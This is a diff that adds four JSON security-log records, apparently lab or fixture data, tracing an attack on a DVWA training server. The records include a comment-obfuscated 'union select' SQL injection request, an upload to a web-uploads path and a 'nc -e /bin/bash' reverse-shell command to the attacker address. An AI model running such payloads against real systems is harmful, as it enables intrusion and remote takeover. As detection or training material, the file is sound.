@@ -1,0 +1,4 @@
+{"timestamp": "2026-07-19T10:02:00", "srcip": "10.20.20.100", "dstip": "10.20.20.10", "rule": {"description": "Web access"}, "full_log": "10.20.20.100 - - [19/Jul/2026:10:02:00 +0900] \"GET /dvwa/login.php HTTP/1.1\" 200 512"}
+{"timestamp": "2026-07-19T10:04:00", "srcip": "10.20.20.100", "dstip": "10.20.20.10", "rule": {"description": "Apache access log"}, "full_log": "10.20.20.100 - - [19/Jul/2026:10:04:00 +0900] \"GET /dvwa/vulnerabilities/sqli/?id=1/**/union/**/select+1,2,3-- HTTP/1.1\" 200 892"}
+{"timestamp": "2026-07-19T10:05:00", "srcip": "10.20.20.100", "dstip": "10.20.20.10", "rule": {"description": "Apache access log"}, "full_log": "10.20.20.100 - - [19/Jul/2026:10:05:00 +0900] \"POST /dvwa/hackable/uploads/upload.php HTTP/1.1\" 200 128"}
+{"timestamp": "2026-07-19T10:06:00", "srcip": "10.20.20.100", "dstip": "10.20.20.10", "rule": {"description": "Process execution"}, "full_log": "www-data: nc -e /bin/bash 10.20.20.100 4444"}
